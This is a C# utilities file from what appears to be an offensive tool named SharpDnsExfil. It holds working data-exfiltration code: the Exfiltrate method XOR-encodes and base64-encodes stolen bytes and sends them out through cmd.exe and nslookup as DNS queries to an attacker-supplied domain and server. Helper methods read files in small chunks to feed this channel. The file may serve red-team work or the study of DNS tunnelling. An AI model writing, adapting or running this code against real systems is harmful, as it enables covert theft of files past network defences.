using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpDnsExfil.Utils
{
    class Utilities
    {

        public void Exfiltrate(byte[] rawData, string Domain, string Server, bool Verbose, bool encode=true)
        {
            if(encode)
            {
                rawData = EncryptionUtils.xorEncDec(rawData, Program.xorKey);
            }

            string data = Convert.ToBase64String(rawData);
            
            string strCmd = $@"/c nslookup.exe -norecurse -query=AAAA {data}.{Domain} {Server} > nul";
            
            Logger.WriteLine($"{data}.{Domain}", Verbose);

            using (Process compiler = new Process())
            {

                compiler.StartInfo.FileName = @"cmd.exe";
                compiler.StartInfo.Arguments = strCmd;
                compiler.StartInfo.UseShellExecute = false;
                compiler.StartInfo.CreateNoWindow = false;
                compiler.StartInfo.RedirectStandardError = true;
                compiler.StartInfo.RedirectStandardOutput = true;
                compiler.Start();
                compiler.WaitForExit();
            }
        }
        
        public long GetFileSize(string filePath)
        {
            var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read);

            return fs.Length;
        }

        public IEnumerable<string> SplitString(string str)
        {
            const int chunkSize = 35;
            for (int i = 0; i < str.Length; i += chunkSize)
                yield return str.Substring(i, Math.Min(chunkSize, str.Length - i));
        }

        //https://github.com/nognomar/AppCenterClient/blob/b852e3eeb6dbee92ff771987a98449447084f3c8/src/Commands/AppCenterUploadApplicationService.cs#L104
        public IEnumerable<byte[]> ReadFileChunks(string fileName)
        {
            const int chunkSize = 45;
            int bytesRead;
            var buffer = new byte[chunkSize];
            var fs = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);

            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                if (bytesRead >= buffer.Length)
                {
                    yield return buffer;
                }
                else
                {
                    var truncatedBuffer = new byte[bytesRead];
                    Array.Copy(buffer, truncatedBuffer, truncatedBuffer.Length);
                    yield return truncatedBuffer;
                }
            }
        }
    }
}
